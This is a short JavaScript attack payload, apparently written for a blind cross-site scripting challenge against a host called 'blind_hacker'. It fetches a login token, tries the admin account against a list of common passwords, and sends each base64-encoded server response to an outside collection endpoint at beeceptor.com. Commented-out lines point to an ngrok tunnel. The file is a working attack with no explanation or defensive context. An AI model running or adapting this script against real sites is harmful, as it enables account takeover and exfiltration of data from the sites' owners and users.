// fetch("http://blind_hacker/?indextoken=VbDcUPpC3uC8wHvOPac4tIGHSiK9qeMbyAwhICb7").
// fetch("http://af11a345.ngrok.io/").

let passwords = ['123456','password','12345678','qwerty','123456789','12345','1234','111111','1234567','dragon','123123','baseball', 'letmein']


fetch("http://blind_hacker/token.php").
    then( res => res.text()).
    then( data => {
                        let token = data.split(" ")[4];

                        passwords.forEach( pass => {

                            // Build formData object.
                            let formData = new FormData();
                            formData.append('username', "admin");
                            formData.append('password', pass);

                            fetch("http://blind_hacker/?indextoken="+token,
                                {
                                    method: 'POST',
                                    body: formData
                                }).
                            then(res => res.text()).
                            then(data => {
                                 fetch("https://ikasten.free.beeceptor.com",
                                   {method: 'POST', 
                                     headers: { "Content-Type": "application/octet-stream" },
                                     body: btoa(data)
                                   }
                                 )})
                        });

                    })
